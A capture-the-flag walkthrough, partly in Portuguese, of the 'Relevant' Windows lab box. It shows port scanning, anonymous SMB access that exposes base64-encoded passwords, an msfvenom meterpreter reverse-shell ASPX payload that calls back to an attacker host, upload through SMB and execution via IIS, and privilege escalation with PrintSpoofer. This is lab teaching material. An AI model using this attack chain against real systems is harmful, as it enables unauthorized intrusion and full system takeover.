# Relevant

```
$ nmap 10.66.181.111 -sV -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-14 08:38 -03
Nmap scan report for 10.66.181.106
Host is up (0.13s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.25 seconds
```


```
$ enum4linux -a 10.66.181.111
"my" variable $which_output masks earlier declaration in same scope at ./enum4linux.pl line 280.
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Dec 14 09:45:18 2025

 =========================================( Target Information )=========================================

Target ........... 10.66.181.111
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.66.181.111 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.66.181.111 )===============================

Looking up status of 10.66.181.111
No reply from 10.66.181.111

 ===================================( Session Check on 10.66.181.111 )===================================
```


```
$ smbclient -L //10.66.180.69 -N --option='client min protocol=NT1' 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
```

```
$ smbclient -N \\\\10.66.180.69\\nt4wrksv --option='client min protocol=NT1'

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 4939936 blocks available
smb: \> more passwords.txt
```

```
$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123   

$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```

I've tried with no success

```
$ xfreerdp3 /u:WORKGROUP\\Bob /p:'!P@$$W0rD!123' /v:10.67.144.15

$rdesktop -u Bob -p '!P@$$W0rD!123' 10.67.144.15

```

Entao eu voltei para a pagina web para fazer fuzzing, mas sem sucesso

entao eu tentei procurar por portas mais altas e encontrei mais essas

```
$ nmap -sV -Pn -p- 10.67.177.74
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 05:14 EST
Nmap scan report for 10.67.177.74
Host is up (0.13s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 246.79 seconds
```

Podemos ver que conseguimos acessar os arquivos

image2

Com isso, podemos subir uma shell em aspx para tentar ganhar acesso a maquina

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.183.77 LPORT=1337 -f aspx -o shell.aspx
```

No SMB

```
smb: \> put shell.aspx
```

Vamos setar as configs

```
msf exploit(multi/handler) > show options 

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.183.77   yes       The listen address (an interface may be specified)
   LPORT     1337             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.
```

QUando acessamos o arquivo malicioso no servidor, ganhamos acesso.


img3

Tbm podemos enviar essa shell
https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx


Vamos ao privsec

```
c:\Users\Bob\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Achei esse artigo sobre o SeImpersonatePrivilege **PrintSpoofer**

https://www.plesk.com/kb/support/microsoft-windows-seimpersonateprivilege-local-privilege-escalation/

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

Podemos confirmar a versao da maquina

```
meterpreter > sysinfo
Computer        : RELEVANT
OS              : Windows Server 2016 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
```

Podemos ver os arquivos que estao no servidor pela pasta `c:\inetpub\wwwroot\nt4wrksv`

```
meterpreter > ls
Listing: c:\inetpub\wwwroot\nt4wrksv
====================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100777/rwxrwxrwx  27136  fil   2025-12-15 05:56:23 -0500  PrintSpoofer64.exe
100666/rw-rw-rw-  98     fil   2020-07-25 11:15:33 -0400  passwords.txt
100666/rw-rw-rw-  3690   fil   2025-12-15 05:31:00 -0500  shell.aspx
```


Agora podemos rodar o arquivo para escalar privilegios

img 4
